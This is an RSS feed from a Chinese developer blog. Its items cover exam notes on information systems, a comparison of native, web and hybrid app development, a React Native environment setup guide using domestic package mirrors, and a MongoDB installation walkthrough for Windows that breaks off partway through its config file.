<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <atom:link href="https://vxhly.github.io/rss.xml" rel="self" type="application/rss+xml"/>
    <title>Coding and Fixing</title>
    <link>https://vxhly.github.io/</link>
    <description>源于生活而高于生活.</description>
    <language>zh-CN</language>
    <pubDate>Mon, 04 Jul 2022 03:06:55 GMT</pubDate>
    <lastBuildDate>Mon, 04 Jul 2022 03:06:55 GMT</lastBuildDate>
    <generator>vuepress-plugin-feed2</generator>
    <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
    <category>信息系统项目管理师</category>
    <category>app</category>
    <category>design</category>
    <category>electron</category>
    <category>graphql</category>
    <category>java</category>
    <category>liunx</category>
    <category>manual</category>
    <category>networking</category>
    <category>nodejs</category>
    <category>other</category>
    <category>pentest</category>
    <category>typescript</category>
    <category>vite</category>
    <category>vuejs</category>
    <category>web</category>
    <item>
      <title>第一章：信息化和信息系统</title>
      <link>https://vxhly.github.io/views/research/Information-system.html</link>
      <guid>https://vxhly.github.io/views/research/Information-system.html</guid>
      <source url="https://vxhly.github.io/rss.xml">第一章：信息化和信息系统</source>
      <description>前言
记录信息化和信息系统章节的相关知识、频繁考点。

</description>
      <category>信息系统项目管理师</category>
      <pubDate>Sat, 02 Jul 2022 14:22:42 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>记录信息化和信息系统章节的相关知识、频繁考点。</p>
</div>

<h1 id="信息系统与信息化" tabindex="-1"> 信息系统与信息化</h1>
<div><p>信息的基本概念</p>
<p>香农指出信息是能够用来消除不确定的东西</p>
</div>
<ul>
<li>信息：信息是系统有序程度的度量。</li>
<li>系统：系统是指由多个元素有机结合在一起, 执行特定的功能以达到特定目的的集合体。</li>
<li>信息系统：信息系统就是输入数据, 通过加工处理, 产生信息的系统。是由计算机硬件、网络和通信设备、计算机软件、信息资源、信息用户和规章制度组成的以处理信息流为目的的人机一体化系统。主要有五个基本功能，即对信息的输入、存储、处理、输出和控制。</li>
</ul>
<h2 id="信息的质量属性" tabindex="-1"> 信息的质量属性</h2>
<ul>
<li>精确性</li>
<li>完整性</li>
<li>可靠性</li>
<li>及时性</li>
<li>经济性</li>
<li>可验证性</li>
<li>安全性</li>
</ul>
<h2 id="信息的传输模型" tabindex="-1"> 信息的传输模型</h2>
<p>信息只有流动起来才能体现其价值, 信息的传输技术是信息技术的核心。</p>
<p>当噪声携带的信息大到一定程度的时候, 在信道中传输的信息可以被噪声掩盖导致传输失败。</p>
<i>Content not supported</i><h2 id="信息化" tabindex="-1"> 信息化</h2>
<h3 id="信息化从-小-到-大-的层次" tabindex="-1"> 信息化从 “小” 到 “大” 的层次</h3>
<ul>
<li>产品信息化</li>
<li>企业信息化</li>
<li>产业信息化</li>
<li>国民经济信息化</li>
<li>社会生活信息化</li>
</ul>
<p>信息化的主体是全体成员, 包括政府、企业、事业、团体和个人。</p>
<h3 id="两网一站" tabindex="-1"> 两网一站</h3>
<ul>
<li>两网：政府内网和政府外网</li>
<li>一站：政府门户网站</li>
</ul>
<h3 id="国家信息化体系六要素" tabindex="-1"> 国家信息化体系六要素</h3>
<ul>
<li>信息资源（核心任务）</li>
<li>信息网络（基础设施）</li>
<li>信息技术应用（龙头）</li>
<li>信息技术和产业（物质基础）</li>
<li>信息化人才（成功之本）</li>
<li>信息化政策法规和标准规范（保障）</li>
</ul>
<h2 id="信息系统生命周期" tabindex="-1"> 信息系统生命周期</h2>
<p>软件的生命周期包括：</p>
<ul>
<li>可行性分析与项目开发计划</li>
<li>需求分析</li>
<li>概要设计</li>
<li>详细设计</li>
<li>编码</li>
<li>测试</li>
<li>运维等阶段</li>
</ul>
<p>信息系统的生命周期：</p>
<ul>
<li>【系统规划阶段】（可行性分析与项目开发计划）=&gt; 立项阶段 ==&gt; 输出文书：可行性研究报告、系统设计任务书</li>
<li>【系统分析阶段】（需求分析）=&gt; 开发阶段 ==&gt; 输出文书：系统说明书</li>
<li>【系统设计阶段】（概要设计、详细设计）=&gt; 开发阶段 ==&gt; 输出文书：系统设计说明书</li>
<li>【系统实施阶段】（编码、测试）=&gt; 开发阶段 ==&gt; 输出文书：实施进展报告、系统测试分析报告</li>
<li>【系统运行和维护阶段】（运维）=&gt; 运维及消亡阶段</li>
</ul>
<h1 id="信息系统的开发方法" tabindex="-1"> 信息系统的开发方法</h1>
<h2 id="结构化方法" tabindex="-1"> 结构化方法</h2>
<p>自顶向下、逐步求精和模块化设计。</p>
<p>主要特点：</p>
<ul>
<li>开发目标清晰化</li>
<li>开发工作阶段化</li>
<li>开发文档规范化</li>
<li>设计方法结构化</li>
</ul>
<p>不足和局限性：</p>
<ul>
<li>开发周期长</li>
<li>难以适应需求变化</li>
<li>很少考虑数据结构</li>
</ul>
<h2 id="面向对象方法" tabindex="-1"> 面向对象方法</h2>
<p>使用结构化方法进行自顶向下的整体划分, 自底向上使用面向对象方法进行开发。</p>
<p>主要特点：</p>
<ul>
<li>封装性</li>
<li>抽象性</li>
<li>继承性</li>
<li>动态链接性</li>
</ul>
<p>不足和局限性：</p>
<ul>
<li>在大型项目的开发上具有一定的局限性</li>
<li>不能涉足系统分析前的开发环节</li>
</ul>
<h2 id="原型化方法" tabindex="-1"> 原型化方法</h2>
<p>利用系统开发工具, 快速建立一个系统模型展示给用户</p>
<p>主要特点：</p>
<ul>
<li>使系统开发的周期缩短、成本和风险降低、速度加快</li>
<li>以用户为中心来开发系统, 用户参与度大大提高, 增加用户的满意度, 提高系统开发的成功率</li>
<li>由于用户参与了系统开发的全过程, 对系统的功能和结构容易理解和接受, 有利于系统的移交, 有利于系统的运行与维护</li>
</ul>
<p>不足和局限性：</p>
<ul>
<li>开发的环境要求高</li>
<li>管理水平要求高</li>
</ul>
<h2 id="面向服务方法" tabindex="-1"> 面向服务方法</h2>
<p>使信息系统快速响应需求与环境变化, 提高系统可复用性、信息资源共享和系统之间的互操作性, 成为影响信息化建设效率的关键问题。</p>
<p>主要特点：</p>
<ul>
<li>重用性</li>
<li>注重效率</li>
<li>松耦合</li>
<li>职责划分</li>
</ul>
<p>不足和局限性：</p>
<ul>
<li>代码冗余</li>
<li>成本高</li>
</ul>
<h1 id="常规信息系统集成技术" tabindex="-1"> 常规信息系统集成技术</h1>
<h2 id="osi-七层模型-开放系统互连参考模型" tabindex="-1"> OSI 七层模型（开放系统互连参考模型）</h2>
<ul>
<li>物理层 =&gt; 协议：RJ-45、V.35、RS232、FDDI
<ul>
<li>包括物理联网媒介</li>
</ul>
</li>
<li>数据链路层 =&gt; 协议：IEEE 802.3/.2、HDLC、PPP、ATM
<ul>
<li>控制网络层与物理层之间的联系</li>
</ul>
</li>
<li>网络层 =&gt; 协议：IP、ICMP、IGMP、ARP、IPX
<ul>
<li>将网络地址翻译成队员的物理地址</li>
</ul>
</li>
<li>传输层 =&gt; 协议：TCP、UDP、SPX
<ul>
<li>负责确保数据可靠、顺序、无错的从 A 点传输到 B 点</li>
</ul>
</li>
<li>会话层 =&gt; 协议：SQL、NFS、RPC
<ul>
<li>负责在网络中两节点之间建立和维持通信, 以及提供交互会话的管理功能</li>
</ul>
</li>
<li>表示层 =&gt; 协议：JPEG、ASCLL、GIF、DES、MPEG
<ul>
<li>如同应用程序和网络之间的翻译官</li>
</ul>
</li>
<li>应用层 =&gt; 协议：HTTP、Telnet、FTP、SMTP
<ul>
<li>负责对软件提供接口以便程序能够使用网络服务</li>
</ul>
</li>
</ul>
<h2 id="tcp-ip-四层模型" tabindex="-1"> TCP/IP 四层模型</h2>
<ul>
<li>应用层（应用层、表示层、会话层）</li>
<li>传输层（传输层）</li>
<li>网络层（网络层）</li>
<li>网络接口层（物理层、数据链路层）</li>
</ul>
<h2 id="协议" tabindex="-1"> 协议</h2>
<ul>
<li>TCP =&gt; 可靠的、面向连接的</li>
<li>UDP =&gt; 不可靠的、无连接的</li>
<li>FTP、HTTP、Telnet、SMTP =&gt; 建立在 TCP 基础之上</li>
<li>TFTP、DNS、DHCP、SNMP =&gt; 建立在 UDP 基础之上</li>
</ul>
<h2 id="网络设备" tabindex="-1"> 网络设备</h2>
<table>
<thead>
<tr>
<th>互联设备</th>
<th>工作层次</th>
</tr>
</thead>
<tbody>
<tr>
<td>中继器</td>
<td>物理层</td>
</tr>
<tr>
<td>网桥</td>
<td>数据链路层</td>
</tr>
<tr>
<td>路由器</td>
<td>网络层</td>
</tr>
<tr>
<td>网关</td>
<td>高层（第 4 ～ 7 层）</td>
</tr>
<tr>
<td>集线器</td>
<td>物理层</td>
</tr>
<tr>
<td>二层交换机</td>
<td>数据链路层</td>
</tr>
<tr>
<td>三层交换机</td>
<td>网络层</td>
</tr>
<tr>
<td>多层交换机</td>
<td>高层（第 4 ～ 7 层）</td>
</tr>
</tbody>
</table>
<h2 id="网络存储技术" tabindex="-1"> 网络存储技术</h2>
<ul>
<li>DAS（直接附加存储）=&gt; 直接与主机系统相连, 很难扩展、传递距离、连接数量、传输速率等方面都受到限制</li>
<li>NAS（网络附加存储）=&gt; 直接与网络介质相连, 需要通过数据网关来访问 NAS, 响应速度快、数据传输速率高, 即插即用</li>
<li>SAN（存储区域网络）=&gt; 管理方便、扩展容易、具有无限的可扩展能力</li>
</ul>
<h2 id="网络接入技术" tabindex="-1"> 网络接入技术</h2>
<h3 id="有线接入方式" tabindex="-1"> 有线接入方式</h3>
<ul>
<li>PSTN</li>
<li>ISDN</li>
<li>ADSL</li>
<li>FTTx+LAN</li>
<li>HFC</li>
</ul>
<h3 id="无线接入方式" tabindex="-1"> 无线接入方式</h3>
<ul>
<li>GPRS</li>
<li>Wifi</li>
<li>3G、4G、5G</li>
</ul>
<h2 id="网络规划与设计" tabindex="-1"> 网络规划与设计</h2>
<h3 id="网络设计工作" tabindex="-1"> 网络设计工作</h3>
<ul>
<li>网络拓扑结构设计</li>
<li>主干网络（核心层）设计</li>
<li>汇聚层和接入层设计</li>
<li>广域网连接与远程访问设计</li>
<li>无线网络设计</li>
<li>网络安全设计</li>
<li>设备选型</li>
</ul>
<h3 id="信息安全的基本要素" tabindex="-1"> 信息安全的基本要素</h3>
<ul>
<li>机密性：确保信息不暴露给未授权的实体或进程</li>
<li>完整性：只有得到允许的人才能修改数据, 并且能够判别出数据是否已被篡改</li>
<li>可用性：得到授权的实体在需要时可访问数据, 即攻击者不能占用所有的资源而阻碍授权者的工作</li>
<li>可控性：可以控制授权范围内的信息流向以及行为方式</li>
<li>可审查性：对出现的网络安全问题提供调查的依据和手段</li>
</ul>
<h2 id="数据库管理系统" tabindex="-1"> 数据库管理系统</h2>
<ul>
<li>Oracle =&gt; 关系型数据库</li>
<li>MySQL =&gt; 关系型数据库</li>
<li>SQLServer =&gt; 关系型数据库</li>
<li>mongoDB =&gt; 非关系型数据库</li>
</ul>
<h2 id="数据仓库" tabindex="-1"> 数据仓库</h2>
<p>数据仓库是一个面向主题的、集成的、非易失的、且随时间变化的数据集合, 用于支持管理决策。</p>
<p>体系结构的 4 个层次</p>
<ul>
<li>数据源</li>
<li>数据的存储与管理</li>
<li>OLAP 服务器（联机分析处理）</li>
<li>前端工具</li>
</ul>
<h2 id="中间件技术" tabindex="-1"> 中间件技术</h2>
<p>中间件的分类：</p>
<ul>
<li>底层型中间件 =&gt; JVM（Java 虚拟机）、CLR（公共语言运行库）、ACE（自适应通信环境）、JDBC（数据库连接）、ODBC（开放数据库互连）</li>
<li>通用型中间件 =&gt; CORBA（公共对象请求代理体系结构）、J2EE、MOM（面向消息的中间件）、COM</li>
<li>集成型中间件 =&gt; WorkFlow、EAI（企业应用集成）</li>
</ul>
<p>为了完成不同层次的集成, 可以采用的技术、产品：</p>
<ul>
<li>为了完成系统底层传输层的集成, 可以采用 CORBA（公共对象请求代理体系结构）技术</li>
<li>为了完成不同系统的信息传递, 可以采用消息中间件产品</li>
<li>为了完成不同硬件和操作系统的集成, 可以采用 J2EE 中间件产品</li>
</ul>
<h2 id="高可用性和高可靠性的规划与设计" tabindex="-1"> 高可用性和高可靠性的规划与设计</h2>
<p>常见的可用性战术：</p>
<ul>
<li>错误检测：用于错误检测的战术包括命令/响应、心跳和异常</li>
<li>错误恢复：用于错误恢复的战术包括表决、主动冗余、被动冗余</li>
<li>错误预防：用于错误预防的战术包括出错的组件从服务中删除、引入进程监视器</li>
</ul>
<h1 id="软件工程" tabindex="-1"> 软件工程</h1>
<h2 id="软件需求" tabindex="-1"> 软件需求</h2>
<ul>
<li>业务需求：反映企业或客户对系统高层次的目标要求</li>
<li>用户需求：描述的是用户的具体目标，或用户要求系统必须能完成的任务</li>
<li>系统需求：从系统的角度来说明软件的需求，包括功能需求、非功能需求和设计约束等</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>APP开发-概念篇</title>
      <link>https://vxhly.github.io/views/app/app-develop-concept.html</link>
      <guid>https://vxhly.github.io/views/app/app-develop-concept.html</guid>
      <source url="https://vxhly.github.io/rss.xml">APP开发-概念篇</source>
      <description>前言
表面上看, 手机 App 都是同样的东西, 就是手机上的应用程序, 点击图标就能运行, 但是它们的底层技术不一样。接下本篇将介绍一下常见的 APP 开发技术以及其的优缺点。

</description>
      <category>app</category>
      <pubDate>Thu, 23 Jan 2020 09:42:39 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>表面上看, 手机 App 都是同样的东西, 就是手机上的应用程序, 点击图标就能运行, 但是它们的底层技术不一样。接下本篇将介绍一下常见的 APP 开发技术以及其的优缺点。</p>
</div>

<h2 id="文章著作权声明" tabindex="-1"> 文章著作权声明</h2>
<div><p>注意</p>
<p>声明以下内容摘自原文 <a href="https://www.ruanyifeng.com/blog/2019/12/hybrid-app-concepts.html" target="_blank" rel="noopener noreferrer">H5 手机 App 开发入门：概念篇</a></p>
</div>
<h2 id="分类" tabindex="-1"> 分类</h2>
<p>按照 APP 的开发技术, APP 大概可以分为以下三类</p>
<div><p>App 分类</p>
<ul>
<li>原生应用（native application, 简称 Native App）</li>
<li>Web 应用（web application, 简称 Web App）</li>
<li>混合应用（hybrid application, 简称 Hybrid App）</li>
</ul>
</div>
<h2 id="优缺点对比" tabindex="-1"> 优缺点对比</h2>
<table>
<thead>
<tr>
<th>特性</th>
<th>Native APP</th>
<th>Web APP</th>
<th>Hybrid APP</th>
</tr>
</thead>
<tbody>
<tr>
<td>开发语言</td>
<td>原生语言（Objective-C、Java、. Net）</td>
<td>网页语言（HTML5+CSS+JS）</td>
<td>原生语言+网页语言</td>
</tr>
<tr>
<td>跨平台性</td>
<td>低</td>
<td>高</td>
<td>高</td>
</tr>
<tr>
<td>设备访问能力</td>
<td>高</td>
<td>低</td>
<td>高</td>
</tr>
<tr>
<td>开发成本</td>
<td>高</td>
<td>低</td>
<td>中</td>
</tr>
<tr>
<td>用户体验</td>
<td>好</td>
<td>差</td>
<td>较好</td>
</tr>
<tr>
<td>安装体验</td>
<td>高（通过应用商店安装）</td>
<td>中（通过移动浏览器）</td>
<td>高（通过应用商店安装）</td>
</tr>
<tr>
<td>升级灵活度</td>
<td>低（总通过应用商店升级）</td>
<td>高</td>
<td>中（总通过应用商店升级）</td>
</tr>
<tr>
<td>向后兼容</td>
<td>差</td>
<td>好</td>
<td>好</td>
</tr>
<tr>
<td>维护更新</td>
<td>复杂</td>
<td>简单</td>
<td>简单</td>
</tr>
<tr>
<td>高级图形</td>
<td>高</td>
<td>中</td>
<td>中</td>
</tr>
</tbody>
</table>
<h2 id="native-app" tabindex="-1"> Native App</h2>
<div><p>定义</p>
<p>Native App 是一种基于智能手机本地操作系统如 iOS、Android、WP 并使用原生程式编写运行的第三方应用程序, 也叫本地 App。原生 App 使用与手机操作系统相同的语言。iOS 的原生 App 使用 Objective-C 语言或 Swift 语言, 安卓使用 Java 语言或 Kotlin 语言。由于跟底层系统的语言和技术模型一致, 所以原生 App 的性能和用户体验都很好。</p>
</div>
<h3 id="优缺点" tabindex="-1"> 优缺点</h3>
<h4 id="优点" tabindex="-1"> 优点</h4>
<ol>
<li>较好的性能和体验</li>
<li>可以使用系统的所有硬件和软件 API, 比如 GPS、摄像头、麦克风、加速计、通知推送等等, 能充分发挥系统的潜力</li>
</ol>
<h4 id="缺点" tabindex="-1"> 缺点</h4>
<ol>
<li>开发成本高, 每个手机平台都要建立一个独立的开发团队, 一般都有 iOS 和安卓两个开发团队。如果出现第三个平台（以前的 Windows Phone, 也许将来的华为鸿蒙 OS）, 就要组建第三个团队, 成本就更高。</li>
<li>原生 App 使用底层操作系统的语言, 都是很重的编译型语言, 开发和调试成本相对较高, 时间周期长</li>
<li>原生 App 必须下载安装才能使用, 只要升级版本, 就必须重新下载安装。用户往往不愿意更新版本, 厂商被迫不得不长期支持很久以前的旧版本。</li>
</ol>
<h2 id="web-app" tabindex="-1"> Web App</h2>
<div><p>定义</p>
<p>WebApp 是指基于 Web 的系统和应用, 其作用是向广大的最终用户发布一组复杂的内容和功能。WebApp 提供一种简单的方式来开始为 App Engine 开发应用程序。Web App 就是运行于网络和标准浏览器上, 基于网页技术开发实现特定功能的应用。</p>
</div>
<h3 id="优缺点-1" tabindex="-1"> 优缺点</h3>
<h4 id="优点-1" tabindex="-1"> 优点</h4>
<ol>
<li>不需要下载安装, 打开浏览器就能使用, 而且总是使用最新版本</li>
<li>对于开发者来说, Web App 写起来比较快, 调试容易, 不需要应用商店的批准就能发布。</li>
</ol>
<h4 id="缺点-1" tabindex="-1"> 缺点</h4>
<ol>
<li>浏览器提供的 API（即 Web API）很有限（目前只有相机、GPS、电池等少数几个）, 大部分系统硬件都不能通过网页访问, 也无法直接读取硬盘文件, 所以 Web App 无法充分利用平台的硬件。</li>
<li>网页通过浏览器渲染, 性能不如原生 App, 不适合做性能要求较高的页面。</li>
</ol>
<h3 id="阻碍推广缘由" tabindex="-1"> 阻碍推广缘由</h3>
<p>为了推广 Web App, 谷歌公司的 Chrome 浏览器团队做了很多努力。他们认为, Web App 足以满足大多数 App 的需求, 但是三大缺陷阻碍它的推广。</p>
<ol>
<li>不能从手机的首屏直接进入。</li>
<li>缺乏手机状态栏和锁屏时的通知推送能力。</li>
<li>不支持脱机访问（即断网也能使用）。</li>
</ol>
<h2 id="hybrid-app" tabindex="-1"> Hybrid APP</h2>
<div><p>定义</p>
<p>Hybrid App, 基于第三方跨平台移动应用引擎框架进行开发。使用 HTML5 和 JS 作为开发, 调用引擎封装的底层功能如照相机、传感器、通讯录等。其具有 Native App 良好用户交互体验的优势, 同时, 具有 Web App 跨平台开发的优势。</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>React Native 填坑指南</title>
      <link>https://vxhly.github.io/views/app/react-native-filling-guide.html</link>
      <guid>https://vxhly.github.io/views/app/react-native-filling-guide.html</guid>
      <source url="https://vxhly.github.io/rss.xml">React Native 填坑指南</source>
      <description>前言
开始学习 React Native, 期间也遇上了许多坑, 本篇将在官方文档基础上补充一些填坑的指南。

</description>
      <category>app</category>
      <pubDate>Thu, 02 Jul 2020 20:58:47 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>开始学习 React Native, 期间也遇上了许多坑, 本篇将在官方文档基础上补充一些填坑的指南。</p>
</div>

<h2 id="官方文档" tabindex="-1"> 官方文档</h2>
<p><a href="https://reactnative.cn/" target="_blank" rel="noopener noreferrer">React Native 官方文档</a></p>
<h2 id="搭建开发环境" tabindex="-1"> 搭建开发环境</h2>
<div><p>提示</p>
<p>这里并不推荐大家使用沙箱环境。沙盒环境大量依赖于国外网络环境, 也不能直接安装第三方原生组件。不建议国内用户使用。</p>
</div>
<p>这一步及其重要, 多数人都会卡在这一步, 包括博主也是在这一步也是卡了很久, 开发环境搭建好了一定会事半功倍, 接下的内容将会带领你少走弯路。</p>
<h3 id="搭建前请换源" tabindex="-1"> 搭建前请换源</h3>
<p>使用过 Node.js 开发项目的都知道我们的 Node.js 项目在安装项目依赖时受限于国内的网络环境, 并不能快速的下载项目依赖, 接下几个步骤教你换源</p>
<p>首先是 <code>yarn</code> 和 <code>npm</code> 的软件源, 使用到的是 <code>cgr</code> 这个命令来快速的切源</p>
<div><pre><code><span>npm</span> i -g cgr
cgr use taobao <span># 此命令可以同时切换 yarn 和 npm 的软件源</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>当然也可以使用以下命令来快速的切源</p>
<div><pre><code><span>npm</span> config <span>set</span> registry https://registry.npm.taobao.org --global
<span>npm</span> config <span>set</span> disturl https://npm.taobao.org/dist --global
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>在开发 IOS 的应用时还需切换 CocoaPods 镜像, 可以参照 <a href="https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/" target="_blank" rel="noopener noreferrer">CocoaPods 镜像使用帮助</a> 进行切源</p>
<div><pre><code><span>cd</span> ~/.cocoapods/repos
pod repo remove master
<span>git</span> clone https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git master
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>MacOS 下建议还需更换 brew 的软件源, 可以参照 <a href="https://developer.aliyun.com/mirror/homebrew" target="_blank" rel="noopener noreferrer">阿里云的镜像源</a> 进行切源</p>
<p>Bash 终端配置</p>
<div><pre><code><span># 替换brew.git:</span>
<span>cd</span> <span>"<span><span>$(</span>brew --repo<span>)</span></span>"</span>
<span>git</span> remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git
<span># 替换homebrew-core.git:</span>
<span>cd</span> <span>"<span><span>$(</span>brew --repo<span>)</span></span>/Library/Taps/homebrew/homebrew-core"</span>
<span>git</span> remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git
<span># 应用生效</span>
brew update
<span># 替换homebrew-bottles:</span>
<span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles'</span> <span>>></span> ~/.bash_profile
<span>source</span> ~/.bash_profile
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>Zsh 终端配置</p>
<div><pre><code><span># 替换brew.git:</span>
<span>cd</span> <span>"<span><span>$(</span>brew --repo<span>)</span></span>"</span>
<span>git</span> remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git
<span># 替换homebrew-core.git:</span>
<span>cd</span> <span>"<span><span>$(</span>brew --repo<span>)</span></span>/Library/Taps/homebrew/homebrew-core"</span>
<span>git</span> remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git
<span># 应用生效</span>
brew update
<span># 替换homebrew-bottles:</span>
<span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles'</span> <span>>></span> ~/.zshrc
<span>source</span> ~/.zshrc
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>绝对禁止</p>
<p>windows 环境下不使用 cnpm 就好, cnpm 安装的模块路径比较奇怪, packager 不能正常识别！</p>
</div>
<h3 id="安装依赖和运行" tabindex="-1"> 安装依赖和运行</h3>
<div><p>提示</p>
<p>安装依赖这边不做重复声明, 官方文档已经非常详细了</p>
</div>
<div><p>坑</p>
<p>React Native 运行时将监听 8081 端口, 所以 8081 端口绝对不能被占用, 否则会导致编译失败等问题</p>
<p>当然如果是因为这个引起的编译失败也不要慌, 将你的 8081 端口占用的进程关掉即可</p>
<div><pre><code><span>lsof</span> -i tcp:8081
<span>kill</span> <span>[</span>pid<span>]</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div></div>
<h2 id="开发填坑" tabindex="-1"> 开发填坑</h2>
<h3 id="导入-iconfont-自定义图标库" tabindex="-1"> 导入 IconFont 自定义图标库</h3>
<p>参考 <a href="https://github.com/iconfont-cli/react-native-iconfont-cli" target="_blank" rel="noopener noreferrer">react-native-iconfont-cli</a></p>
<h4 id="step-1" tabindex="-1"> Step 1</h4>
<p>安装插件</p>
<div><pre><code><span># Yarn</span>
<span>yarn</span> <span>add</span> react-native-svg
<span>yarn</span> <span>add</span> react-native-iconfont-cli --dev

<span># Npm</span>
<span>npm</span> <span>install</span> react-native-svg
<span>npm</span> <span>install</span> react-native-iconfont-cli --save-dev
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="step-2" tabindex="-1"> Step 2</h4>
<p>静态链接。请注意您使用的 React-Native 版本号</p>
<div><pre><code><span># RN &lt; 0.60</span>
react-native <span>link</span> react-native-svg

<span># RN >= 0.60</span>
<span>cd</span> ios <span>&amp;&amp;</span> pod <span>install</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="step-3" tabindex="-1"> Step 3</h4>
<p>生成配置文件</p>
<div><pre><code>npx iconfont-init
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="step-4" tabindex="-1"> Step 4</h4>
<p>开始生成 React-Native 标准组件</p>
<div><pre><code>npx iconfont-rn
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Windows 下安装 MongoDB</title>
      <link>https://vxhly.github.io/views/design/install-mongodb-on-windwos.html</link>
      <guid>https://vxhly.github.io/views/design/install-mongodb-on-windwos.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Windows 下安装 MongoDB</source>
      <description>前言
MongoDB 是目前在 IT 行业非常流行的一种非关系型数据库 (NoSql), 其灵活的数据存储方式备受当前 IT 从业人员的青睐。这里主要讲如何在 Windows 平台下安装 MongoDB。

</description>
      <category>design</category>
      <pubDate>Mon, 29 May 2017 17:11:30 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>MongoDB 是目前在 IT 行业非常流行的一种非关系型数据库 (NoSql), 其灵活的数据存储方式备受当前 IT 从业人员的青睐。这里主要讲如何在 Windows 平台下安装 MongoDB。</p>
</div>

<h2 id="下载" tabindex="-1"> 下载</h2>
<p><a href="http://www.mongodb.com/download-center?jmp=nav#community" target="_blank" rel="noopener noreferrer">MongoDB 官网下载链接</a></p>
<h2 id="手动简单的配置" tabindex="-1"> 手动简单的配置</h2>
<h3 id="配置环境变量" tabindex="-1"> 配置环境变量</h3>
<p>安装成功之后, 将 mongodb 目录下的 bin 目录添加至 path 变量中, 如:</p>
<p><img src="/assets/install-mongodb-1.png" alt="Windows 下安装 MongoDB"></p>
<h3 id="创建数据库文件存放目录" tabindex="-1"> 创建数据库文件存放目录</h3>
<p>创建数据库文件的存放位置, 比如 <code>D:\mongodb\data\db</code> 。启动 mongodb 服务之前需要必须创建数据库文件的存放文件夹, 否则命令不会自动创建, 而且不能启动成功。</p>
<p><img src="/assets/install-mongodb-2.png" alt="Windows 下安装 MongoDB"></p>
<p>接下来打开命令行窗口, 切换到 <code>D:\MongoDB\bin</code> 目录执行如下命令:</p>
<div><pre><code>mongod --dbpath D:<span>\</span>MongoDB<span>\</span>data<span>\</span>db <span># 其中 --dbpath 是指定数据库存放目录</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>这是命令行窗口会打印一些启动信息, 最后一行显示为如下信息时表示启动成功了</p>
<div><pre><code><span>2017</span>-05-29T17:23:16.752+0800 I NETWORK  <span>[</span>thread1<span>]</span> waiting <span>for</span> connections on port <span>27017</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="创建日志文件存放目录" tabindex="-1"> 创建日志文件存放目录</h3>
<p>我们需要指定 log 目录, 所以我们创建 log 目录 <code>D:\MongoDB\data\logs\mongodb.log</code> .</p>
<div><pre><code>mongod --dbpath D:<span>\</span>MongoDB<span>\</span>data<span>\</span>db --logpath<span>=</span>D:<span>\</span>MongoDB<span>\</span>data<span>\</span>logs<span>\</span>mongodb.log --logappend
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/install-mongodb-3.png" alt="Windows 下安装 MongoDB"></p>
<p>这是命令行窗口会打印一些启动信息, 最后一行显示为如下信息时表示启动成功了</p>
<div><pre><code><span>2017</span>-05-29T17:23:16.752+0800 I NETWORK  <span>[</span>thread1<span>]</span> waiting <span>for</span> connections on port <span>27017</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装为-windows-服务" tabindex="-1"> 安装为 Windows 服务</h3>
<div><pre><code>sc create MongoDB <span>binPath</span><span>=</span> <span>"D:\MongoDB<span title="\b">\b</span>in\mongod.exe --service --dbpath D:\MongoDB\data\db --logpath=D:\MongoDB\data\logs\mongodb.log --logappend"</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>启动服务时需要管理员权限</p>
<div><pre><code>net start MongoDB
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/install-mongodb-4.png" alt="Windows 下安装 MongoDB"></p>
<h2 id="使用配置文件" tabindex="-1"> 使用配置文件</h2>
<p>很遗憾, 官方下载的安装包里面没有默认的配置文件, 若想使用配置文件只能自己建一个了, 另外个人也推荐使用配置文件来管理 MongoDB 的配置, 使用配置文件配置数据库文件、日志文件以及其它的一些配置都一目了然</p>
<ol>
<li>解压安装包到 <code>D:\MongoDB</code></li>
<li>建立数据库目录 <code>D:\MongoDB\data</code></li>
<li>建立日志目录 <code>D:\MongoDB\logs</code></li>
<li>建立配置文件目录 <code>D:\MongoDB\etc</code></li>
<li>建立配置文件 <code>D:\MongoDB\etc\mongodb.conf</code></li>
</ol>
<h3 id="配置文件" tabindex="-1"> 配置文件</h3>
<div><pre><code><span>dbpath</span><span>=</span>D:<span>\</span>MongoDB<span>\</span>data <span># 数据库路径</span>
